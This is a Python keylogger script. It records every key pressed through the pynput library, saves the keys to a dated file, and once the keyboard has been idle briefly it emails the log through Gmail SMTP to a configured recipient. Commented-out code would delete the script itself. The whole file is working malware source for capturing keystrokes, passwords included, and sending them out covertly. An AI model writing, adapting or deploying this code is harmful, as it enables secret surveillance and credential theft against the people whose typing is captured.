from pynput import keyboard
from datetime import datetime
from decouple import config
import smtplib
import time
import threading
import os

EMAIL = config("MY_EMAIL")
APP_PASS = config("APP_PASSWORD")
SEND_TO = config("SEND_TO")

input_keys = list()
stop_logging = False
TIMEOUT = 5
timeout_start = time.time()
write_file = str(datetime.now()).split(' ')[0] + "_keys.txt"


# Function used to write all the input keys to a file.
def write_logged_keys():
    with open(write_file, "a+") as file:
        for item in input_keys:
            if item[0:3] == "Key":
                item = item.split(".")[1]
            file.write(item + "\n")
        file.seek(0)
        return file.read()


# Function that checks if the timeout time-frame has been reached.  If so, it will call
# the write file function and then exit stop running the file
def check_inactivity():
    while True:
        if time.time() > timeout_start + TIMEOUT:
            mail_body = write_logged_keys()
            send_email(mail_body)
            # code that could delete this file after some amount of idle time.
            # cur_dir = os.getcwd()
            # os.remove(cur_dir + "/keylogger.py")

            os._exit(0)
        time.sleep(5)


def send_email(file):
    with smtplib.SMTP("smtp.gmail.com", port=587) as connection:
        connection.starttls()
        connection.login(user=EMAIL, password=APP_PASS)
        connection.sendmail(
            from_addr=EMAIL,
            to_addrs=SEND_TO,
            msg=f"Subject:Logged Keys \n\n {file}"
        )


# This runs the check_activity function in the background
back_thread = threading.Thread(name="timeout_check", target=check_inactivity)
back_thread.start()


# This uses the pynput library to listen for events.  If the event is a key-down event, it will
# add the pressed key to list of all keys pressed.
with keyboard.Events() as events:
    for event in events:
        if type(event) is keyboard.Events.Press:
            key_pressed = str(event.key)
            print(key_pressed)
            input_keys.append(key_pressed)
            timeout_start = time.time()
